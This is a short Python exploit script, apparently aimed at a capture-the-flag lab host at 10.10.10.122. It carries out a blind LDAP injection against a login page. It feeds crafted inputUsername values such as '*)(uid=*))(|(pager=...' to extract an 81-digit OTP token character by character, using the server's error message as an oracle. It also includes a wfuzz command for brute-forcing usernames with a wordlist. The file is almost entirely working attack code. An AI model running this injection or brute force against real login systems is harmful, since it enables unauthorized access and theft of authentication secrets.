#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

# if you need bruteforce username, use wfuzz directly:
# ```
# wfuzz -c -u http://10.10.10.122/login.php --hw 233 -X POST -d "inputUsername=FUZZ&inputOTP=12345678"
# -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
# ```

import sys
import time
from urllib.parse import quote_plus as urlencode

import requests

debug = False

if debug:
    host = '127.0.0.1:8181'
else:
    host = '10.10.10.122'

endp = '/login.php'
finaluri = 'http://' + host + endp

postparam = {"inputUsername": None, "inputOTP": "0000"}

# Assume the LDAP Query is: `(&(username=blahblah)(token=blahblah))`

token = ""
print("[*] Extracting token...")
num_list = [str(n) for n in range(10)]

try:
    sess = requests.session()
    sess.get('http://' + host + '/')
    time.sleep(1)
    usrname = '*)(uid=*))(|(pager={param1}{param2}*'
    print("[*] Current Extracted Data: ", sep='')
    while len(token) != 81:
        for i in num_list:
            postparam["inputUsername"] = urlencode(usrname.format(param1=token, param2=i))
            r = sess.post(finaluri, data=postparam)
            if 'cannot login' in r.text.lower():
                token += i
                sys.stdout.write(i)
                sys.stdout.flush()
            else:
                pass
except requests.exceptions.ConnectionError as ce:
    print("Get Banned! Wait 6 mins.")
    time.sleep(360)
